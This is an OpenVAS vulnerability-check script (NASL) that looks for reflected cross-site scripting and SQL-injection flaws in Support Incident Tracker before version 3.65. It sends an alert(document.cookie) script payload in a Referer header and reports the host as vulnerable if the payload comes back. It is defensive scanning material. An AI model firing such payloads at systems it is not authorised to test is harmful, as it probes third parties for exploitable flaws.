##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sit_mult_sql_inj_and_xss_vuln.nasl 11818 2018-10-10 11:35:42Z asteins $
#
# Support Incident Tracker SiT! Multiple SQL Injection And XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802388");
  script_version("$Revision: 11818 $");
  script_cve_id("CVE-2011-5071", "CVE-2011-5072", "CVE-2011-5073", "CVE-2011-5074",
                "CVE-2011-5075");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-10 13:35:42 +0200 (Wed, 10 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-02-01 15:15:30 +0530 (Wed, 01 Feb 2012)");
  script_name("Support Incident Tracker SiT! Multiple SQL Injection And XSS Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46019");
  script_xref(name:"URL", value:"http://sitracker.org/wiki/ReleaseNotes365");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/519636");
  script_xref(name:"URL", value:"https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_sit_support_incident_tracker.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_dependencies("support_incident_tracker_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sit/installed");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site
  and to cause SQL Injection attack to gain sensitive information.");
  script_tag(name:"affected", value:"Support Incident Tracker before version 3.65.");
  script_tag(name:"insight", value:"The flaws are due to improper input validation errors in multiple
  scripts before being used in SQL queries and also allows attackers to
  execute arbitrary HTML.");
  script_tag(name:"solution", value:"Upgrade to the Support Incident Tracker version 3.65 or later.");
  script_tag(name:"summary", value:"This host is running Support Incident Tracker and is prone to
  multiple sql injection and cross-site scripting vulnerabilities.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

CPE = 'cpe:/a:sitracker:support_incident_tracker';

if(!sitPort = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:sitPort))
  exit(0);

host = http_host_name(port:sitPort);

url = dir + "/forgotpwd.php?userid=1&action=sendpwd";
req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Referer: '<script>alert(document.cookie);</script>\r\n",
             "Authorization: Basic bGFtcHA6\r\n\r\n");

res = http_keepalive_send_recv(port:sitPort, data:req);

if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
   "<script>alert(document.cookie);</script>" >< res)
{
  security_message(port:sitPort, data:"The target host was found to be vulnerable.");
  exit(0);
}

exit(99);
